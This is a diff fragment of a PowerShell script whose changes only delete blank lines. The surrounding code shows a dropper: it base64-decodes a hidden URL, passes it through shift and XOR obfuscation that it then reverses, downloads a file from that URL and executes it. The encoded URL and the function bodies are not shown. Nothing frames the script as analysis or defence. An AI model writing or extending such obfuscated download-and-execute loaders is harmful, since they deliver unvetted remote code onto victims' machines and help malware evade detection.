@@ -19,7 +19,6 @@ function Dec-B64 {
     }
 }
 
-
 $decUrl = Dec-B64 -encStr $encUrl
 
 function Dwn-Fl {
@@ -48,7 +47,6 @@ function Exe-Fl {
     }
 }
 
-
 function Shft-Chr {
     param (
         [string]$inputStr,
@@ -65,7 +63,6 @@ function Shft-Chr {
         return $null
     }
 }
-
 
 function Xor-Chr {
     param (
@@ -84,17 +81,13 @@ function Xor-Chr {
     }
 }
 
-
 $obfUrl = Shft-Chr -inputStr $decUrl -shft 1
 $obfUrl = Xor-Chr -inputStr $obfUrl -key 5
-
 
 $deObfUrl = Xor-Chr -inputStr $obfUrl -key 5
 $deObfUrl = Shft-Chr -inputStr $deObfUrl -shft -1
 
-
 $flPath = Dwn-Fl -url $deObfUrl
-
 
 if ($flPath) {
     Exe-Fl -filePath $flPath
